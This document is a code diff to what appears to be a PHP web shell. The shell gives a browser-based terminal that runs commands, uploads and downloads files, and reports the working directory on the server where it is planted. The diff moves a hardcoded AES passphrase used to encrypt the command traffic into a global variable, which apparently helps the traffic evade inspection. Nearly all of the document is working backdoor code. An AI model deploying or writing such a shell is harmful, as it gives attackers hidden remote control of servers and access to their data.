@@ -1,6 +1,8 @@
-<?php
-function CryptoJSAesEncrypt($passphrase, $plain_text)
+<?php 
+$secretkey = "this-is-not-lmao";
+function CryptoJSAesEncrypt($plain_text)
 {
+    $passphrase = $GLOBALS['secretkey'];
     $salt = openssl_random_pseudo_bytes(256);
     $iv = openssl_random_pseudo_bytes(16);
     $iterations = 999;
@@ -10,8 +12,9 @@ function CryptoJSAesEncrypt($passphrase, $plain_text)
     return json_encode($data);
 }
 
-function CryptoJSAesDecrypt($passphrase, $jsonString)
+function CryptoJSAesDecrypt($jsonString)
 {
+    $passphrase = $GLOBALS['secretkey'];
     $jsondata = json_decode(json_decode($jsonString,true),true);
     try {
         $salt = hex2bin($jsondata["salt"]);
@@ -118,7 +121,7 @@ function featureUpload($path, $file, $cwd)
 if (isset($_GET["feature"])) {
 
     $response = NULL;
-    $data = json_decode(CryptoJSAesDecrypt("this-is-not-lmao", base64_decode($_POST['data'])),true);
+    $data = json_decode(CryptoJSAesDecrypt(base64_decode($_POST['data'])),true);
     switch ($_GET["feature"]) {
         case "shell":
             // $cmd = $_POST['cmd'];
@@ -139,7 +142,7 @@ if (isset($_GET["feature"])) {
     }
 
     header("Content-Type: text/plain");
-    echo CryptoJSAesEncrypt("this-is-not-lmao", $response);
+    echo CryptoJSAesEncrypt($response);
     die();
 }
 
@@ -301,9 +304,10 @@ if (isset($_GET["feature"])) {
         var historyPosition = 0;
         var eShellCmdInput = null;
         var eShellContent = null;
+        let secretkey = "<?php echo $secretkey ?>";
 
-        function CryptoJSAesDecrypt(passphrase, encrypted_json_string) {
-
+        function CryptoJSAesDecrypt(encrypted_json_string) {
+            var passphrase = secretkey;
             var obj_json = JSON.parse(encrypted_json_string);
             var encrypted = obj_json.ciphertext;
             var salt = CryptoJS.enc.Hex.parse(obj_json.salt);
@@ -319,7 +323,8 @@ if (isset($_GET["feature"])) {
             return decrypted.toString(CryptoJS.enc.Utf8);
         }
 
-        function CryptoJSAesEncrypt(passphrase, plain_text) {
+        function CryptoJSAesEncrypt(plain_text) {
+            var passphrase = secretkey;
             var salt = CryptoJS.lib.WordArray.random(256);
             var iv = CryptoJS.lib.WordArray.random(16);
             var key = CryptoJS.PBKDF2(passphrase, salt, {
@@ -368,7 +373,7 @@ if (isset($_GET["feature"])) {
                     cmd: command,
                     cwd: CWD
                 }, function(response) {
-                    resp = JSON.parse(CryptoJSAesDecrypt("this-is-not-lmao",JSON.stringify(response)));
+                    resp = JSON.parse(CryptoJSAesDecrypt(JSON.stringify(response)));
                     console.log(resp);
                         if (resp.hasOwnProperty('file')) {
                             featureDownload(resp.name, resp.file)
@@ -384,7 +389,7 @@ if (isset($_GET["feature"])) {
             if (eShellCmdInput.value.trim().length === 0) return; // field is empty -> nothing to complete
 
             function _requestCallback(data) {
-                var d = JSON.parse(CryptoJSAesDecrypt("this-is-not-lmao",JSON.stringify(data)));
+                var d = JSON.parse(CryptoJSAesDecrypt(JSON.stringify(data)));
                 if (d.files.length <= 1) return; // no completion
 
                 if (d.files.length === 2) {
@@ -439,7 +444,7 @@ if (isset($_GET["feature"])) {
                         file: file,
                         cwd: CWD
                     }, function(response) {
-                        resp = JSON.parse(CryptoJSAesDecrypt("this-is-not-lmao",JSON.stringify(response)));
+                        resp = JSON.parse(CryptoJSAesDecrypt(JSON.stringify(response)));
                         _insertStdout(resp.stdout.join("\n"));
                         updateCwd(resp.cwd);
                     });
@@ -479,7 +484,7 @@ if (isset($_GET["feature"])) {
                 return;
             }
             makeRequest("?feature=pwd", {}, function(response) {
-                resp = JSON.parse(CryptoJSAesDecrypt("this-is-not-lmao",JSON.stringify(response)));
+                resp = JSON.parse(CryptoJSAesDecrypt(JSON.stringify(response)));
                 CWD = resp.cwd;
                 _updatePrompt();
             });
@@ -557,7 +562,7 @@ if (isset($_GET["feature"])) {
                     }
                 }
             };
-            xhr.send("data="+btoa(JSON.stringify(CryptoJSAesEncrypt("this-is-not-lmao",getQueryString()))));
+            xhr.send("data="+btoa(JSON.stringify(CryptoJSAesEncrypt(getQueryString()))));
         }
 
         document.onclick = function(event) {
